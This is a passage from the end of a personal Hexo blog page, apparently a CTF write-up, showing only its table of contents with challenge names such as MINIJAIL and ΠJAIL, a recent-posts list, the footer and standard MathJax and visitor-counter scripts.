href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">6.4.</span> <span class="toc-text">攻击流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.5.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM-NOTIFY"><span class="toc-number">7.</span> <span class="toc-text">DOM NOTIFY</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MINIJAIL"><span class="toc-number">8.</span> <span class="toc-text">MINIJAIL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951"><span class="toc-number">8.1.</span> <span class="toc-text">解法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952"><span class="toc-number">8.2.</span> <span class="toc-text">解法2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%953"><span class="toc-number">8.3.</span> <span class="toc-text">解法3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%954"><span class="toc-number">8.4.</span> <span class="toc-text">解法4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%955"><span class="toc-number">8.5.</span> <span class="toc-text">解法5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%CE%A0JAIL"><span class="toc-number">9.</span> <span class="toc-text">ΠJAIL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CR00NEY"><span class="toc-number">10.</span> <span class="toc-text">CR00NEY</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/17/reverse-learning/" title="reverse-learning">reverse-learning</a><time datetime="2025-10-17T04:52:59.000Z" title="发表于 2025-10-17 12:52:59">2025-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/09/hackasat-2020-quals/" title="hackasat-2020-quals">hackasat-2020-quals</a><time datetime="2025-10-09T06:51:05.000Z" title="发表于 2025-10-09 14:51:05">2025-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/02/20251002%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/" title="20251002论文精读">20251002论文精读</a><time datetime="2025-10-02T09:04:55.000Z" title="发表于 2025-10-02 17:04:55">2025-10-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/30/hackasat-2022-quals/" title="hackasat-2022-quals">hackasat-2022-quals</a><time datetime="2025-09-30T12:06:48.000Z" title="发表于 2025-09-30 20:06:48">2025-09-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/27/20250927%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250927随缘刷题">20250927随缘刷题</a><time datetime="2025-09-27T04:45:15.000Z" title="发表于 2025-09-27 12:45:15">2025-09-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const loadMathjax = () => {
    if (!window.MathJax) {
      window.MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']],
          tags: 'none',
        },
        chtml: {
          scale: 1.1
        },
        options: {
          enableMenu: true,
          renderActions: {
            findScript: [10, doc => {
              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
                const display = !!node.type.match(/; *mode=display/)
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
                const text = document.createTextNode('')
                node.parentNode.replaceChild(text, node)
                math.start = {node: text, delim: '', n: 0}
                math.end = {node: text, delim: '', n: 0}
                doc.math.push(math)
              }
            }, '']
          }
        }
      }

      const script = document.createElement('script')
      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
      script.id = 'MathJax-script'
      script.async = true
      document.head.appendChild(script)
    } else {
      MathJax.startup.document.state(0)
      MathJax.texReset()
      MathJax.typesetPromise()
    }
  }

  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>